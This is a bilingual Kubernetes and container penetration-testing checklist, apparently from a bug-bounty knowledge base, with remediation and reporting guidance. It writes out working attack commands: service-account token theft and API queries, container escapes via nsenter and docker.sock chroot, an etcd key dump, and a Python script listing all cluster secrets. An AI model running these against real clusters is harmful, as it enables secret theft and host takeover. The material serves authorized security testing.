---
id: clk-kubernetes-container
title: Kubernetes & Container
owasp_anchor: [WSTG-CONF, OWASP-K8S-Top10]
cwe: [CWE-269, CWE-732]
severity_typical: P1-P2
playbook: playbooks/kubernetes_container.yaml
last_updated: 2026-05-14
sources: []
maturity: stable
---

# Kubernetes & Container Checklist

> 双语 / Bilingual: K8s 控制面 / 数据面、SA token、kubelet、etcd、RBAC、容器逃逸面。
> 用法：先 Recon 判定是否在 K8s pod / 是否能访问 kube-apiserver / 是否能逃逸到 host。
> Authorization-only：不要触碰非靶机 namespace；列资源用 `--dry-run=server` 优先验证。

---

## 1. Recon & 指纹

- [ ] HTTP header / 错误页：`x-kubernetes-pf-flowschema-uid` / `x-kubernetes-pf-prioritylevel-uid`
- [ ] `/healthz` `/version` `/openapi/v2` 返回 K8s API server 指纹
- [ ] `/metrics` cAdvisor / kubelet / kube-state-metrics 暴露
- [ ] Ingress class：`nginx` / `traefik` / `istio` / `contour`
- [ ] 子域 / SAN 含 `*.svc.cluster.local`、`*.internal`
- [ ] 容器内：`/proc/1/cgroup` / `/.dockerenv` / `/run/secrets/kubernetes.io/serviceaccount/`
- [ ] 环境变量 `KUBERNETES_SERVICE_HOST`、`KUBERNETES_PORT_443_TCP`

## 2. ServiceAccount Token 泄露 / 滥用

- [ ] 容器内默认挂载 `/var/run/secrets/kubernetes.io/serviceaccount/token`
- [ ] `automountServiceAccountToken: true`（默认开）
- [ ] 拿 token 后：`kubectl --token=$T --server=https://kubernetes.default --insecure-skip-tls-verify auth can-i --list`
- [ ] 老版本绑定 token（无 expiration）vs Bound SA token（有 audience / exp）
- [ ] token 跨 pod / 跨 namespace 共用
- [ ] SSRF 入口可读 `/var/run/secrets/...`（文件协议或路径穿越）

## 3. RBAC 错配 / 提权

- [ ] `cluster-admin` 绑定到 `system:authenticated` / `system:unauthenticated`
- [ ] `*/*` verb 给某 SA → 等同 cluster-admin
- [ ] `pods/exec`、`pods/attach`、`pods/portforward` 任一允许，等于 RCE 进任意 pod
- [ ] `secrets get/list` 等于读所有密码 / TLS key
- [ ] `serviceaccounts/token` create 允许 → 任意 SA 借用
- [ ] `nodes/proxy` get → 走 kubelet API 任意 pod 执行
- [ ] `escalate` / `bind` verb 在 RoleBinding 上 → 自我提权
- [ ] `impersonate` verb → 任意身份调 API
- [ ] `validatingwebhookconfigurations` / `mutatingwebhookconfigurations` 写 → 注入恶意 webhook

## 4. kubelet API / etcd 直连

- [ ] kubelet `:10250` 是否启用匿名（`--anonymous-auth=true`）
- [ ] `/pods` 列所有 pod；`/run/<ns>/<pod>/<container>` 在容器里执行命令
- [ ] kubelet `:10255` 只读端口（旧版）
- [ ] etcd `:2379` 暴露：`etcdctl --endpoints=... get / --prefix --keys-only`
- [ ] etcd 是否要求 client cert（缺失 → 直接 dump 全部 secrets）
- [ ] kube-scheduler / kube-controller-manager `:10257` `:10259` profiling

## 5. Container Escape 面

### 5.1 配置层
- [ ] `privileged: true` → 直接挂载 host 设备 `mount /dev/sda1 /mnt`
- [ ] `hostPID: true` → `nsenter -t 1 -a sh` 进入 host PID namespace
- [ ] `hostNetwork: true` → 嗅探 host 流量、访问 localhost-only 服务
- [ ] `hostPath` volume 挂 `/`、`/var/run/docker.sock`、`/var/lib/kubelet`
- [ ] `capabilities.add: SYS_ADMIN / SYS_PTRACE / NET_ADMIN`
- [ ] `securityContext.runAsUser: 0`（root in container）+ host UID 映射
- [ ] AppArmor / SELinux / seccomp profile = `unconfined`

### 5.2 docker.sock
- [ ] 容器里挂载 `/var/run/docker.sock` → `docker -H unix:///var/run/docker.sock run -v /:/host --rm ubuntu chroot /host`
- [ ] containerd / cri-o socket 同理

### 5.3 镜像 / runtime CVE
- [ ] runc / containerd 历史 escape 链 [example: CVE-2019-5736 类、CVE-2024-21626 类] 是否打补丁
- [ ] kernel 版本：检查公开容器逃逸 PoC 是否覆盖（`uname -r`）
- [ ] cgroup v1 release_agent 写入逃逸（旧 kernel + 特定挂载）

## 6. Image / Helm 供应链

- [ ] image pull secret `.dockerconfigjson` 泄露 → 镜像仓库读写
- [ ] 私有 registry 公开列出 tag：`/v2/_catalog` / `/v2/<repo>/tags/list`
- [ ] Helm chart secret：`values.yaml` 内联 password / token
- [ ] `helm get values --all <release>` 查 release secret
- [ ] OCI image 签名 / cosign 校验是否启用
- [ ] kustomize / ArgoCD `Application` CR 指向不可信外部 git 源

## 7. Namespace / 网络边界

- [ ] NetworkPolicy 缺失 → pod 任意 east-west
- [ ] CNI 默认全通（Flannel 无 policy 实现）
- [ ] Service 类型 `LoadBalancer` 误开公网
- [ ] Ingress 同 host 多 path / 不同 namespace 抢占
- [ ] mTLS（Istio / Linkerd）开启但 PeerAuthentication 设 `PERMISSIVE`
- [ ] CoreDNS poisoning（写 ConfigMap）

## 8. Cloud-managed K8s 特性

- [ ] EKS：Pod IRSA token 暴露面（`AWS_WEB_IDENTITY_TOKEN_FILE`）
- [ ] GKE：metadata concealment 是否开启；Workload Identity vs node SA
- [ ] AKS：kubelet identity vs pod identity
- [ ] 集群 admin kubeconfig 在 CI 里残留

## 9. 自动化辅助

```bash
# 容器内自检
cat /run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/namespace
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# RBAC 自查
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify auth can-i --list

# kubelet anon
curl -sk https://<node-ip>:10250/pods

# etcd dump
etcdctl --endpoints=https://<etcd>:2379 \
  --cacert=ca.crt --cert=client.crt --key=client.key \
  get / --prefix --keys-only | head -50

# 公开扫描
# https://github.com/aquasecurity/kube-bench
# https://github.com/aquasecurity/kube-hunter
# https://github.com/cyberark/KubiScan
# https://github.com/inguardians/peirates

# Nuclei
nuclei -tags k8s,kubernetes,kubelet,etcd -u https://target

# Trivy 扫镜像
trivy image --severity HIGH,CRITICAL <repo>:<tag>
```

```python
# 用泄露 token 拉所有 secrets（仅自有靶机）
import requests, urllib3
urllib3.disable_warnings()
TOKEN = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
H = {"Authorization": f"Bearer {TOKEN}"}
r = requests.get("https://kubernetes.default.svc/api/v1/secrets", headers=H, verify=False)
print(r.status_code, r.json().get("kind"))
```

## 10. Reporting Angle

* **Title 模板**：`<组件> <flaw> allows <attacker> to <impact> via <vector>`
  例：`Privileged sidecar with hostPath=/ allows pod-to-host escape and node takeover`
* **CVSS 3.1 上下界**：
  * 容器逃逸 + node root：9.0-9.8 / VRT P1
  * 跨 namespace RCE / cluster-admin：8.5-9.5 / VRT P1
  * 列出 secrets / etcd 读：7.5-8.5 / VRT P2
  * kubelet 匿名 `/pods`（仅枚举）：5.3-6.5 / VRT P3
* **CWE 推荐**：CWE-269（权限管理）/ CWE-732（资源/挂载策略错配）
* **PoC 必须**：仅在自有 ns / 自有 pod 演示；token 截断显示；不附带任何受害方 secret 内容；命令前后状态截图
* **Suggested Fix**（≥ 2 条）：
  * `automountServiceAccountToken: false` 默认关
  * Pod Security Admission `restricted` profile
  * RBAC 最小化 + `kubectl auth can-i` 回归审计
  * 强制 NetworkPolicy default-deny
  * 镜像签名 + admission webhook（Kyverno / OPA Gatekeeper）

## 11. 已迁移技法（来自 KB）

- [[techniques/sa_token_apiserver_pivot|SA token → kube-apiserver pivot]]
- [[techniques/kubelet_anon_pod_exec|kubelet 匿名 /run 执行]]
- [[techniques/hostpath_root_escape|hostPath= / 挂载逃逸]]
- [[techniques/etcd_unauth_secret_dump|etcd 无认证 dump secrets]]
